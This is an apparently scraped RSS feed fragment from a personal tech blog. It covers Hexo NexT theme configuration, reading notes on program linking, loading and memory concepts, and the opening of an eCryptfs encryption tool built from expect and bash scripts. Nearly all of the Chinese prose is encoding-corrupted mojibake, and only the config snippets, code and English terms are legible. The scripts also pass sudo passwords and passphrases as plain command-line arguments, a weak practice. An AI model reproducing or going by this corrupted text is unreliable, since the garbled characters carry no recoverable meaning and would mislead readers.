&lt;p>è§£å³æ¹å¼ï¼éç½®Nextä¸»é¢ä¸­ç&lt;code>_config.yml&lt;/code>éé¢ç
&lt;code>auto_excerpt = true&lt;/code>&lt;/p>
&lt;h3 id="åå®¹æ¾ç¤ºä¸é¨åä½æ¯æ¾ç¤ºæ ¼å¼ä¸æ¯markdownçæ ¼å¼">åå®¹æ¾ç¤ºä¸é¨åï¼ä½æ¯æ¾ç¤ºæ ¼å¼ä¸æ¯Markdownçæ ¼å¼&lt;/h3>
&lt;p>ä½¿ç¨ &lt;!-- more --> æ¿ä»£ auto_excerpt&lt;/p>
&lt;h2 id="æ·»å æç« éè¯»éç»è®¡ä¸è¯è®ºåè½">æ·»å æç« éè¯»éç»è®¡ä¸è¯è®ºåè½&lt;/h2>
&lt;p>
&lt;a href="https://notes.wanghao.work/2015-10-21-%E4%B8%BANexT%E4%B8%BB%E9%A2%98%E6%B7%BB%E5%8A%A0%E6%96%87%E7%AB%A0%E9%98%85%E8%AF%BB%E9%87%8F%E7%BB%9F%E8%AE%A1%E5%8A%9F%E8%83%BD.html#%E9%85%8D%E7%BD%AELeanCloud" target="_blank" rel="noopener">ä¸ºNexTä¸»é¢æ·»å æç« éè¯»éç»è®¡åè½&lt;/a>&lt;/p>
&lt;p>
&lt;a href="https://giserdaishaoqing.github.io/2017/11/24/hexo%E5%8D%9A%E5%AE%A2%E8%AF%84%E8%AE%BA%E6%96%B0%E7%A5%9E%E5%99%A8%E2%80%94%E2%80%94Valine/" target="_blank" rel="noopener">hexoåå®¢è¯è®ºæ°ç¥å¨ââValine&lt;/a>&lt;/p>
&lt;hr>
&lt;h2 id="æ·»å æç´¢åè½">æ·»å æç´¢åè½&lt;/h2>
&lt;h3 id="åºæ¯">åºæ¯&lt;/h3>
&lt;p>åæå¤äºä¹åï¼å°±éè¦ä¸ä¸ªæç´¢åè½è½å¤å¿«éçæ¾å°èªå·±ä»¥åçåå®¢ãæä»¥å¨æä»¬çåå®¢ä¸å å¥æç´¢åè½æ¯å¾æå¿è¦çä¸ä»¶äºæã&lt;/p>
&lt;h3 id="å®è£æä»¶">å®è£æä»¶&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>ç´æ¥å¨èªå·±çåå®¢æä»¶å¤¹ä¸ï¼ç¹å»é¼ æ å³é®éæ©Git Bash Here&lt;br>
&lt;code>npm install hexo-generator-searchdb --save&lt;/code>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>ä¿®æ¹ç«ç¹éç½®æä»¶:åå®¢æ ¹ç®å½ä¸ç_config.ymlæä»¶ï¼å¯ä»¥å¨ä»»æä½ç½®å å¥ï¼&lt;/p>
&lt;/li>
&lt;/ul>
&lt;pre>&lt;code class="language-c++">search:
path: search.xml
field: post
format: html
limit: 10000
&lt;/code>&lt;/pre>
&lt;p>PS:æ¯ä¸ªåå·åé¢é½æç©ºæ ¼ã
ä¿®æ¹ä¸»é¢éç½®æä»¶
æçè·¯å¾ï¼/blog/themes/nextä¸ç_config.ymlæä»¶ï¼è¿è¡ç¼è¾ã&lt;/p>
&lt;pre>&lt;code class="language-c">local_search:
enable: true
&lt;/code>&lt;/pre>
&lt;p>PS:åå·åé¢é½æç©ºæ ¼ã
æ­¤æ¶ï¼é¨ç½²å°githubï¼æå¼ç½é¡µå°±å¯ä»¥çå°æç´¢åè½äºï¼å®¹ææ·»å ï¼ä½¿ç¨èµ·æ¥å¾æ¹ä¾¿ï¼æ¨èæ·»å ï¼å¢å ç½ç«åå¥½åº¦ã&lt;/p>
&lt;hr>
&lt;h2 id="æ·»å ç«åèå¤©å¯¹è¯åè½">æ·»å ç«åèå¤©å¯¹è¯åè½&lt;/h2>
&lt;p>
&lt;a href="https://www.ezlippi.com/blog/2018/01/next-chat.html" target="_blank" rel="noopener">Hexoåå®¢æ·»å å¨çº¿èç³»åè½&lt;/a>&lt;/p>
&lt;hr>
&lt;h2 id="æ·»å rssåè½">æ·»å RSSåè½&lt;/h2>
&lt;h3 id="åºæ¬æ­¥éª¤">åºæ¬æ­¥éª¤&lt;/h3>
&lt;h4 id="å®è£-rss-æä»¶">å®è£ RSS æä»¶&lt;/h4>
&lt;p>å¨blogæ ¹ç®å½ä¸æ§è¡å½ä»¤å®è£ RSS æä»¶: hexo-generator-feed&lt;/p>
&lt;p>&lt;code>npm install hexo-generator-feed --save&lt;/code>&lt;/p>
&lt;h4 id="éç½®-rss-æä»¶">éç½® RSS æä»¶&lt;/h4>
&lt;p>ç¼è¾ Hexo çéç½®æä»¶ _config.ymlï¼æ·»å ä»¥ä¸ä»£ç &lt;/p>
&lt;pre>&lt;code class="language-c"># RSS è®¢éæä»¶
plugin:
- hexo-generator-feed
#RSS æä»¶éç½®
feed:
type: rss2
path: rss.xml
limit: 20
hub:
content: true
&lt;/code>&lt;/pre>
&lt;h4 id="ä¸»é¢å¼å¯-rss-æ¯æ">ä¸»é¢å¼å¯ RSS æ¯æ&lt;/h4>
&lt;p>NexT ä¸»é¢ï¼é»è®¤å¼å¯ RSSãå¶å®ä¸»é¢è¯·åèä¸»é¢ææ¡£ã&lt;/p>
&lt;h4 id="çæ-rss">çæ RSS&lt;/h4>
&lt;p>æ§è¡ &lt;code>hexo clean &amp;amp;&amp;amp; hexo g &amp;amp;&amp;amp; hexo d&lt;/code> éæ°çæåå®¢æä»¶å¹¶å®æé¨ç½²å³å¯ã&lt;/p>
&lt;h2 id="æ·»å æ¾ç¤ºæç« ææ°æ´æ°æ¶é´">æ·»å æ¾ç¤ºæç« ææ°æ´æ°æ¶é´&lt;/h2>
&lt;p>ä¿®æ¹ï¼åå®¢ä¸»ç®å½ï¼&lt;code>/themes/next/layout/_macro/post.swig æä»¶ï¼å¨&amp;lt;span class=&amp;quot;post-time&amp;quot;&amp;gt;...&amp;lt;/span&amp;gt;&lt;/code>æ ç­¾åæ·»å :&lt;/p>
&lt;pre>&lt;code class="language-python">{%if post.updated and post.updated &amp;gt; post.date%}
&amp;lt;span class=&amp;quot;post-updated&amp;quot;&amp;gt;
&amp;amp;nbsp; | &amp;amp;nbsp; {{ __('post.updated') }}
&amp;lt;time itemprop=&amp;quot;dateUpdated&amp;quot; datetime=&amp;quot;{{ moment(post.updated).format() }}&amp;quot; content=&amp;quot;{{ date(post.updated, config.date_format) }}&amp;quot;&amp;gt;
{{ date(post.updated, config.date_format) }}
&amp;lt;/time&amp;gt;
&amp;lt;/span&amp;gt;
{% endif %}
&lt;/code>&lt;/pre>
&lt;p>æåå¨æä»¶ä¸­çææä¸ºï¼
&lt;img src="http://www.guozet.me/images/in-post/2018-06-10-Add-post-update.png" alt="2018-06-10-Add-post-update">&lt;/p>
&lt;p>ä¿®æ¹ä¸»é¢éç½®æä»¶ï¼åå®¢ä¸»ç®å½ï¼``themes/next/_config.yml`ï¼å¢å ä¸è¡&lt;/p>
&lt;p>&lt;code>display_updated: true&lt;/code>&lt;/p>
&lt;p>å¦æéè¦ä¸­ææ¯æï¼é£ä¹å°±éè¦å¨ä¸­æçæä»¶éé¢æ·»å updatedçç¿»è¯ï¼
åå®¢éç½®æä»¶ä¸­ç language åæ°ä¿®æ¹å¯¹åºçè¯­è¨éç½®æä»¶ï¼åå®¢ä¸»ç®å½ï¼&lt;/p>
&lt;p>&lt;code>/themes/next/languages/zh_Hans.yml&lt;/code>&lt;/p>
&lt;p>å°è¿éå°±è®¾ç½®å®æäºï¼å¦æä½ å¨åæç« çæ¶åå å¥äºUpdateçåæ°ï¼é£ä¹å°±ä¼æ¾ç¤ºä¸ºä½ å å¥çåæ°æ¶é´ã
æ¯å¦ï¼&lt;code>updated: 2018-01-01 12:00:00&lt;/code>
å¦æä½ æ²¡æå å¥åæ°ï¼é£ä¹å°±ä¼æ¾ç¤ºä¸ºè¿ä¸ªæä»¶çæåä¿®æ¹æ¶é´ã&lt;/p>
&lt;h3 id="é®é¢">é®é¢&lt;/h3>
&lt;h4 id="æå¼rssçæ¶ååºç°éè¯¯æç¤º">æå¼RSSçæ¶åï¼åºç°éè¯¯æç¤º&lt;/h4>
&lt;blockquote>
&lt;p>This page contains the following errors:&lt;br>
error on line 317 at column 18: PCDATA invalid Char value 11&lt;br>
Below is a rendering of the page up to the first error.&lt;/p>
&lt;/blockquote>
&lt;p>æ ¹æ®éè¯¯æç¤ºï¼ç¨ç¼è¾å¨æå¼ public ç®å½ä¸ çrss.xml æ atom.xmlãæ¾å°ç¬¬317è¡18åï¼æ¯ä¸ä¸ªæªç¥å­ç¬¦å°æ¹åï¼åå åºè¯¥æ¯æä»æçCSDNåå®¢éé¢å¯¼åºæ¥çæç« ï¼åºç°äºä¸äºæªç¥çé®é¢ï¼ãæ ¹æ®å°æ¹ååååå®¹å¤æ­åºæ¥æ¯åªä¸ªæç« åºç°çé®é¢ã&lt;/p>
&lt;p>æå¼å¯¹åºçæå¼å¯¹åºæç« ç.mdææ¡£ï¼æ¾å°ç¸åºççä½ç½®ï¼æ¿æ¢åºé®é¢çå­ç¬¦ã&lt;/p>
&lt;p>éæ°çæ rss.xml å¹¶é¨ç½²: &lt;code>hexo clean &amp;amp;&amp;amp; hexo g &amp;amp;&amp;amp; hexo d&lt;/code>&lt;br>
é®é¢è§£å³&lt;/p>
&lt;h4 id="å³é­æèµåè½">å³é­æèµåè½&lt;/h4>
&lt;p>ææ¶ä¸éè¦å¼éæèµåè½ï¼å¨&lt;code>theme-&amp;gt;next-&amp;gt;_config.yml&lt;/code>æä»¶ä¸­æ³¨éææèµæ¨¡åã&lt;/p>
&lt;pre>&lt;code class="language-c"># Reward
# reward_comment: Donate comment here
# wechatpay: /images/wechatpay.jpg
# alipay: /images/alipay.jpg
#bitcoin: /images/bitcoin.png
&lt;/code>&lt;/pre></description></item><item><title>ç¨åºåçèªæä¿®å»--é¾æ¥ãè£è½½ä¸åº_éè¯»ç¬è®°</title><link>http://www.guozet.me/post/Programmers-self-cultivation-link-loading-library/</link><pubDate>Wed, 09 May 2018 13:04:27 +0000</pubDate><guid>http://www.guozet.me/post/Programmers-self-cultivation-link-loading-library/</guid><description>&lt;p>ãç¨åºåçèªæä¿®å»&amp;ndash;é¾æ¥ãè£è½½ä¸åºãç¬¬ä¸ç« éè¯»ç¬è®°
Terry.Tang ååä½åè½¬è½½è¯·æ³¨æåºå¤ ãç¨åºåçèªæä¿®å»&amp;ndash;é¾æ¥ãè£è½½ä¸åºãéè¯»ç¬è®°1/10
2017/4/18&lt;/p>
&lt;hr>
&lt;h1 id="ä¸åºæ¬æ¦å¿µ">ä¸.åºæ¬æ¦å¿µ&lt;/h1>
&lt;p>åé¡¾è®¡ç®æºè½¯ç¡¬ä»¶ä½ç³»ä¸­çå ä¸ªéè¦æ¦å¿µï¼å¨è®¡ç®æºç¹å¤çç¡¬ä»¶è®¾å¤ä¸­ï¼ä¸ä¸ªé¨ä»¶æä¸ºå³é®ï¼éè¦å¤çå¨CPUãåå­åI/0æ§å¶è¯çãèæä»¬ç¨åºåçç®çå°±æ¯ååå©ç¨è¿ä¸ä¸ªé¨åã&lt;/p>
&lt;!-- more -->
&lt;h2 id="ååæ¡¥ç»æ">&lt;strong>ååæ¡¥ç»æ&lt;/strong>&lt;/h2>
&lt;ol>
&lt;li>è®¾è®¡åå ï¼åç¦»ä½éè®¾å¤åé«éè®¾å¤ï¼ç®ååä¸çåæ¡¥ç»æçè®¾è®¡ææ¬ã&lt;/li>
&lt;li>è®¾è®¡æ¹å¼ï¼åæ¡¥(ISA)è´è´£å¤çä½éè®¾å¤&amp;mdash;Modern, Sound card, Printerç­ï¼åæ¡¥(PCI)è´è´£å¤çé«éè®¾å¤&amp;mdash;åå­ï¼USBæ¥å£ï¼å¾å½¢è®¾å¤ç­ï¼ååæ¡¥ç¡¬ä»¶ç»æå¾å¦ä¸å¾æç¤ºï¼&lt;/li>
&lt;/ol>
&lt;p>&lt;img src="http://img.blog.csdn.net/20170418113117265?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdGFuZzE1MjQ1Mw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="è¿éåå¾çæè¿°">&lt;/p>
&lt;h2 id="smpåå¤æ ¸">&lt;strong>SMPåå¤æ ¸&lt;/strong>&lt;/h2>
&lt;p>å¯¹ç§°å¤å¤çå¨(SMP,Symmetrical Multi-Processingï¼: å¤ä¸ªCPUå¹¶è¡ï¼æå¤å°ä½ååè½ä¸æ ·ï¼ç¸äºå¯¹ç§°çã&lt;br>
&lt;strong>ç¼ºç¹&lt;/strong>ï¼æä»¬çç¨åºå¹¶ä¸è½åæ¶åè§£æå¤ä¸ªä¸ç¸å¹²çå­é®é¢åæ¶è¿è¡å¨åä¸ªCPUä¸ï¼å¹¶ä¸ææ¬å¤ªé«&lt;br>
&lt;strong>ä½¿ç¨åºå&lt;/strong>ï¼å¤§åæ°æ®åºï¼ç½ç»æå¡å¨ä¸ï¼åæ¶å¤çç¸äºç¬ç«çå¤§éè¯·æ±&lt;br>
&lt;strong>æ¹è¿æ¹å¼&lt;/strong>ï¼ä¿çå¤ä¸ªæ ¸å¿ï¼å±äº«ä»·æ ¼æè´µçç¼å­é¨ä»¶&amp;mdash;&amp;ndash;å¤æ ¸å¤çå¨ï¼Multi-core Processorï¼&lt;/p>
&lt;h2 id="ç³»ç»è½¯ä»¶">&lt;strong>ç³»ç»è½¯ä»¶&lt;/strong>&lt;/h2>
&lt;p>å¯å¤§è´åä¸ºä¸¤ç±»ï¼&lt;br>
1.å¹³å°è½¯ä»¶&amp;mdash;æä½ç³»ç»ï¼é©±å¨ç¨åºï¼è¿è¡åºï¼ç³»ç»å·¥å·ï¼åºç¨ç¨åºï¼&lt;br>
2.è¾å©ç¨åºå¼å&amp;mdash;ç¼è¯å¨ï¼æ±ç¼å¨ï¼é¾æ¥å¨ç­å¼åå·¥å·åå¼ååº&lt;br>
&lt;strong>æ¬ä¹¦éç¹ä»ç»ï¼é¾æ¥å¨ï¼è¿è¡åºåå¼ååº&lt;/strong>&lt;/p>
&lt;h2 id="è®¡ç®æºç³»ç»è½¯ä»¶ä½ç³»ç»æä¸­--åå±ç»æçå ä¸ªæ¦å¿µ">è®¡ç®æºç³»ç»è½¯ä»¶ä½ç³»ç»æä¸­&amp;ndash;åå±ç»æçå ä¸ªæ¦å¿µï¼&lt;/h2>
&lt;ul>
&lt;li>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>**æ¥å£(Interface)ï¼**æ¯ä¸ªå±æ¬¡ä¹é´ç¸äºéä¿¡çéä¿¡åè®®ï¼æ¥å£çä¸é¢å±æ¥æä¾å¹¶å®ä¹æ¥å£ï¼æ¥å£çä¸é¢å±æ¥ä½¿ç¨æ¥å£æä¾çåè½&amp;mdash;-æ¥å£å°½å¯è½ä¿æä¸åï¼ååå¼å®¹&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;/table>
&lt;/li>
&lt;li>&lt;strong>ä¸­é´å±&lt;/strong>ï¼é¤äºç¡¬ä»¶ååºç¨ç¨åºï¼å¶ä»é½æ¯ä¸­é´å±&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="http://img.blog.csdn.net/20170418115137592?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdGFuZzE1MjQ1Mw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="è¿éåå¾çæè¿°">&lt;/p>
&lt;p>æ¯å¦ï¼ç³»ç»è°ç¨æ¥å£çå®ç°æ¯éè¿è½¯ä»¶ä¸­æ­(Software Interrupt)çæ¹å¼æä¾çï¼Linux&amp;mdash;0x80ä¸­æ­å·ï¼ Window&amp;mdash;0x2Eå·ä¸­æ­&lt;/p>
&lt;h1 id="äºæä½ç³»ç»">äº.æä½ç³»ç»&lt;/h1>
&lt;p>**ä¸¤ä¸ªåè½ï¼**æä¾æ½è±¡çæ¥å£åç®¡çç¡¬ä»¶èµæº&lt;/p>
&lt;h2 id="1cpuå©ç¨ç">&lt;strong>1.CPUå©ç¨ç&lt;/strong>&lt;/h2>
&lt;p>æ¼åæ¹å¼ï¼åä¸è¿è¡ä¸ä¸ªç¨åº&amp;ndash;&amp;gt;å¤éè¿è¡ç¨åº&amp;ndash;&amp;gt;åæç³»ç»&amp;mdash;&amp;gt;å¤ä»»å¡ç³»ç»(ä½¿å¾å¤è¿ç¨è½å¾å¥½å±äº«CPU)
æä½ç³»ç»æ¥ç®¡äºææçç¡¬ä»¶èµæºï¼å¹¶ä¸æ¬èº«è¿è¡å¨ä¸ä¸ªåç¡¬ä»¶ä¿æ¤ççº§å«ãææçåºç¨ç¨åºé½ä»¥è¿ç¨ï¼Processï¼çæ¹å¼è¿è¡å¨æ¯æä½ç³»ç»æéæ´ä½ççº§å«ï¼æ¯ä¸ªè¿ç¨é½æç¬ç«çå°åç©ºé´ï¼ä½¿å¾è¿ç¨ä¹é´çå°åç©ºé´ç¸äºéç¦»ã
&lt;strong>å¤ä»»å¡ç³»ç»ä¸­ï¼ç®åCPUåéæ¹å¼æ¯è¾æµè¡çæ¯æ¢å å¼(Preemptive)&amp;mdash;ä¼åçº§å³å®&lt;/strong>&lt;/p>
&lt;h2 id="2ioè®¾å¤é©±å¨">&lt;strong>2.I/Oè®¾å¤é©±å¨&lt;/strong>&lt;/h2>
&lt;p>æä½ç³»ç»ä½ä¸ºç¡¬ä»¶å±çä¸å±ï¼æ¯å¯¹ç¡¬ä»¶çç®¡çåæ½è±¡ï¼å¶ä¸­çç¡¬ä»¶è®¾å¤é©±å¨ç¨åºå¤çææçç¡¬ä»¶ç»èï¼å®åæä½ç³»ç»åæ ¸ä¸èµ·è¿è¡å¨ç¹æçº§ï¼ä½ååæ ¸åªææä¸å®çç¬ç«æ§ã
è®¾å¤é©±å¨ç¨åºçå¼åå·¥ä½ä¸è¬ç±ç¡¬ä»¶åå®¶å®æï¼æä½ç³»ç»ä¸ºå¶æä¾ç¸åºçæ¥å£åæ¡æ¶ï¼å¡æ¯æç§è¿ä¸ªæ¥å£åæ¡æ¶è¿è¡å¼åçé©±å¨ç¨åºé½è½å¤ã&lt;/p>
&lt;h1 id="ä¸åå­å©ç¨">ä¸.åå­å©ç¨&lt;/h1>
&lt;p>å½å¤ä»»å¡ç³»ç»åºç°ä¹åï¼CPUçå©ç¨çå¾å°æåï¼é£ä¹æ¥ä¸æ¥æä¸ä¸ªææ¾çé®é¢ï¼&lt;strong>å¦ä½å°è®¡ç®æºä¸æéçç©çåå­åéç»å¤ä¸ªç¨åºä½¿ç¨&lt;/strong>&lt;/p>
&lt;p>åå§çç©çåå­ç´æ¥ä½¿ç¨çæ¹å¼å­å¨ä»¥ä¸å ä¸ªé®é¢ï¼&lt;/p>
&lt;ol>
&lt;li>å°åç©ºé´ä¸éç¦»ï¼æ¶æçç¨åºå¯ä»¥ä¿®æ¹å¶ä»ç¨åºçåå­æ°æ®ï¼å¯¼è´å¶ä»ä»»å¡å´©æº&lt;/li>
&lt;li>åå­ä½¿ç¨æçä½ï¼ç¨åºæ§è¡æ¶ï¼çæ§ç¨åºéè¦å°æ´ä¸ªç¨åºè£å¥åå­ä¸­å¼å§è¿è¡ï¼ä»»å¡åæ¢æ¶åï¼åå­ä¸å¤ï¼åå°å½åè¿è¡ç¨åºååå°ç£çä¸­ã&amp;mdash;å¤§éæ°æ®æ¢å¥æ¢åºï¼æçååä½ä¸&lt;/li>
&lt;li>ç¨åºè¿è¡çå°åä¸ç¡®å®ï¼åå­ç»ç¨åºçç©ºé²åºåçä½ç½®æ¯ä¸ç¡®å®çï¼ä¸å©äºç¼åç¨åºï¼å ä¸ºç¨åºç¼åæ¶ï¼è®¿é®æ°æ®åæä»¤è·³è½¬æ¶çç®çå°åå¾å¤é½æ¯åºå®çã&lt;br>
&amp;mdash;&amp;mdash;ä¸ºäºè§£å³è¿å ä¸ªé®é¢ï¼å¢å ä¸­é´å±&amp;mdash;èæå°åï¼éè¿æäºæ å°çæ¹å¼ï¼å°æ´ä¸ªèæå°åè½¬æ¢æå®éçç©çå°åã&lt;/li>
&lt;/ol>
&lt;h2 id="1è§£å³éç¦»é®é¢">&lt;strong>1.è§£å³éç¦»é®é¢&lt;/strong>&lt;/h2>
&lt;p>ç¨åºçæä½³æ§è¡ç¯å¢ï¼ä¸ä¸ªåä¸çå°åç©ºé´ï¼èªå·±çCPUï¼å ææ´ä¸ªè®¡ç®æºèµæºä¸ç¨å³å¿å¶ä»çç¨åºã
å°åç©ºé´æ¦å¿µï¼å¯æ³è±¡æä¸ä¸ªå¾å¤§çæ°ç»ï¼æ¯ä¸ªæ°ç»çåç´ æ¯ä¸ä¸ªå­èï¼èè¿ä¸ªæ°ç»å¤§å°ç±å°åç©ºé´çå°åé¿åº¦å³å®ï¼æ¯å¦32ä½ï¼å°åçº¿å³å®æ¯å¤å°ä½ï¼çå°åç©ºé´ä½4GBã&lt;/p>
&lt;blockquote>
&lt;p>&lt;strong>å°åç©ºé´å¯åä¸ºèæå°åç©ºé´ï¼Virtual Address Spaceï¼ &amp;amp; ç©çå°åç©ºé´ï¼Physical Address Spaceï¼&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>æ³¨æï¼ç©çå°åç©ºé´å¯è½æ¯4Gï¼ä½æ¯å¯è½ç±äºåå­æ¡åªæ2Gï¼ææææçç©çå°åå°±åªæ¯åé¢2Gäº
&lt;strong>è§£å³å°åç©ºé´ä¸éç¦»åè¿è¡å°åä¸ç¡®å®çæ¹å¼&amp;mdash;&amp;mdash;-åæ®µ(Segmentation)&lt;/strong>&lt;/p>
&lt;h3 id="åæ®µsegmentation">&lt;strong>åæ®µ(Segmentation)&lt;/strong>&lt;/h3>
&lt;p>ç±æä½ç³»ç»è®¾ç½®æ å°å½æ°,å®éç±ç¡¬ä»¶å®æï¼å°ç¨åºæéè¦çåå­å¤§å°çèæç©ºé´æ å°å°æä¸ªå°åç©ºé´ã
&lt;img src="http://img.blog.csdn.net/20170418200253207?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdGFuZzE1MjQ1Mw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="è¿éåå¾çæè¿°">&lt;/p>
&lt;p>&lt;strong>è§£å³åå­ä½¿ç¨æçä½ä¸çé®é¢&amp;mdash;&amp;mdash;-åé¡µ(Paging)&lt;/strong>&lt;/p>
&lt;h3 id="åé¡µpaging">åé¡µ(Paging)**&lt;/h3>
&lt;p>æ¦å¿µï¼æå°åç©ºé´(èæ&amp;amp;ç©ç)äººä¸ºå°ç­åæåºå®å¤§å°çé¡µï¼æ¯ä¸é¡µçå¤§å°ç±ç¡¬ä»¶å³å®ï¼æèç¡¬ä»¶æ¯æå¤ç§å¤§å°çé¡µï¼ç±æä½ç³»ç»æ¥éæ©å³å®é¡µçå¤§å°ã&lt;/p>
&lt;p>å½æä»¬æè¿ç¨çèæå°åç©ºé´æé¡µåå²ï¼æå¸¸ç¨çæ°æ®åä»£ç é¡µè£è½½å°åå­ä¸­ï¼æä¸å¸¸ç¨çä»£ç åæ°æ®ä¿å­å°ç£çä¸­ï¼å¨éè¦ç¨çæ¶ååæå®ä»ç£çä¸­ååºæ¥å³å¯(é¡µéè¯¯ä¸­æ­)ã&lt;/p>
&lt;pre>&lt;code>![è¿éåå¾çæè¿°](http://img.blog.csdn.net/20170418201138609?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvdGFuZzE1MjQ1Mw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast)
&lt;/code>&lt;/pre>
&lt;p>æ³¨æï¼èæå­å¨çä½¿ç¨ä¾é MMUçé¨ä»¶(éæå¨CPUåé¨)æ¥å®æé¡µæ å°ã&lt;/p></description></item><item><title>Linuxéæå å¯æä»¶ç³»ç»1_ä»£ç åæ</title><link>http://www.guozet.me/post/Linux-Transparent-Encrypted-File-System/</link><pubDate>Tue, 08 May 2018 14:12:25 +0000</pubDate><guid>http://www.guozet.me/post/Linux-Transparent-Encrypted-File-System/</guid><description>&lt;p>ä¸»è¦åä¸ºä¸ä¸ªé¨åï¼&lt;/p>
&lt;blockquote>
&lt;p>ç¬¬ä¸é¨åæ¯äº¤äºèæ¬ä¸èªå¨åèæ¬(Ubuntu)&lt;br>
ç¬¬äºé¨åæ¯çé¢è®¾è®¡&lt;br>
ç¬¬ä¸é¨åæ¯å¼æºé¡¹ç®ä»£ç çè¯´æ&lt;/p>
&lt;/blockquote>
&lt;p>ç¨æ·ä½¿ç¨çæ¯åºäºQTçç¨æ·çé¢ï¼å¯ä»¥éæ©éè¦å å¯çæä»¶è·¯å¾ï¼å·²ç»å å¯ä¹åçè·¯å¾ãå½å¾å½¢çé¢æ¥æ¶å°è¿äºä¿¡æ¯ä¹åï¼ä¼å°è¯¥ä¿¡æ¯è½¬æ¢æä¸æ®µåå«äº8ä¸ªåæ°çæ°æ®åä¼ éç»shellèæ¬è¿è¡å¤çã&lt;/p>
&lt;!-- more -->
&lt;h2 id="ä¸äº¤äºèæ¬ä¸èªå¨åèæ¬">ä¸.äº¤äºèæ¬ä¸èªå¨åèæ¬&lt;/h2>
&lt;h3 id="1-å¤çäº¤äºå¼è¿ç¨çèæ¬">1. å¤çäº¤äºå¼è¿ç¨çèæ¬&lt;/h3>
&lt;pre>&lt;code class="language-sh">#!/usr/bin/expect
#è¯¥æä»¶æ¯å¤çäº¤äºå¼è¿ç¨çä¸»è¦æä»¶ï¼ç¨æ¥å¯¹è¾åºä¿¡æ¯è¿è¡è§£æï¼å¹¶èªå¨è¾å¥å¯¹åºçä¿¡æ¯
set timeout 2
set ecryptfs_real [lindex $argv 0]
#çå®æä»¶è·¯å¾,å®éçå å¯æä»¶ä½ç½®
set ecryptfs_mount [lindex $argv 1]
#æè½½ç¹è·¯å¾ï¼è§£å¯æä»¶çä½ç½®
set tangpassword [lindex $argv 2]
#ç¨æ·å¯ç 
set key_type1 [lindex $argv 3]
#å¯ç ç®¡çæ¹å¼
set Passphrase [lindex $argv 4]
#æä»¶å å¯å¯ç 
set ecryptfs_type [lindex $argv 5]
#æä»¶å å¯ç±»å
set key_bytes [lindex $argv 6]
#æä»¶å å¯ä½æ°
set ecryptfs_fspath [lindex $argv 7]
#è·¯å¾æ¯å¦å å¯
set ecryptfs_filename [lindex $argv 8]
#æä»¶åæ¯å¦å å¯
spawn sudo mount -t ecryptfs $ecryptfs_real $ecryptfs_mount#æè½½å å¯æä»¶ç³»ç»
expect &amp;quot;password for tang:&amp;quot;
send &amp;quot;$tangpassword\n&amp;quot;
#å¡«åç¨æ·å¯ç 
expect &amp;quot;Select key type to use for newly created files:&amp;quot;
send &amp;quot;$key_type1\n&amp;quot;
expect
#å¡«åå å¯æ¹å¼ç±»å &amp;quot;Passphrase:&amp;quot;
send &amp;quot;$Passphrase\n&amp;quot;
#å¡«åæä»¶å å¯å¯ç 
expect &amp;quot;aes&amp;quot;
send &amp;quot;$ecryptfs_type\n&amp;quot;
#å¡«åæä»¶å å¯ç±»å
expect &amp;quot;Select key bytes:&amp;quot;
send &amp;quot;$key_bytes\n&amp;quot;
#å¡«åæä»¶å å¯ä½æ°
expect &amp;quot;Enable plaintext passthrough&amp;quot;
send &amp;quot;$ecryptfs_fspath\n&amp;quot;
#éæ©æ¯å¦å¯¹è·¯å¾å å¯
expect &amp;quot;Enable filename encryption&amp;quot;
send &amp;quot;$ecryptfs_filename\r&amp;quot;
interact
#éæ©æ¯å¦å¯¹æä»¶åå å¯
#expect eof
#exit
&lt;/code>&lt;/pre>
&lt;h3 id="2-ä¸qtäº¤äºçèæ¬">2. ä¸QTäº¤äºçèæ¬&lt;/h3>
&lt;pre>&lt;code class="language-sh">#!/bin/bash
##è¯¥èæ¬ä¸»è¦ä½ç¨æ¯æ¥æ¶QTä¼ éè¿æ¥çåéï¼å¹¶è¿è¡è§£æï¼ä¹åï¼è°ç¨ç¸åºçäº¤äºå¤çèæ¬##æ¥æ¶QTä¼ éè¿æ¥çåé
ECRYPTFS_REAL=$1 ##è·åå å¯è·¯å¾
PASSWD=$2 ##ç¨æ·å¯ç 
PASS_TYPE=$3 ##å¯ç ç±»å
PASSPHRASE=$4 ##å å¯è·¯å¾ï¼æè½½ç¹
ECRYPTFS_TYPE=$5 ##å å¯ç±»å
ECRYPTFS_BIT=$6 ##å å¯ä½æ°
ECRYPTFS_FS=$7 ##è·¯å¾æ¯å¦å å¯
ECRYPTFS_FILENAME=$8 ##æä»¶åæ¯å¦å å¯
count=0 ##åå§å¼
dir=&amp;quot;/tmp/mnt/ecryptfs$count&amp;quot; ##åå§æè½½ç¹
echo &amp;quot;Ecryptfså å¯ç¨åºå¯å¨ä¸­...&amp;quot;
echo &amp;quot;ç³è¯·è¶çº§ç¨æ·æé,è¯·è¾å¥ç¨æ·å¯ç &amp;quot;
##/bin/testpass
df 1&amp;gt;/tmp/1.txt 2&amp;gt;/dev/null
##æ£æµå½åå·²ç»ä½¿ç¨çæè½½ç¹ï¼å»ºç«ä¸ä¸ªæ°çæè½½ç¹æ¥ä½¿ç¨
echo &amp;quot;å·²ç»æè½½çå å¯ç®å½æï¼&amp;quot;
while cat /tmp/1.txt | grep -q $dir 2&amp;gt;/dev/null
##æè½½ç¹ æ¯å¦ä½¿ç¨äº
do
echo $dir
let count=$count+1 ##ä¸å®è¦æ¯/bin/bashå¦æ¯/bin/shè¿éå°±ä¼åºé
dir=&amp;quot;/tmp/mnt/ecryptfs$count&amp;quot; ###æ°æè½½ç¹
done
rm /tmp/1.txt
echo &amp;quot;æ°å¢æè½½ç®å½ï¼&amp;quot; ###åå»ºæ°çæè½½ç¹
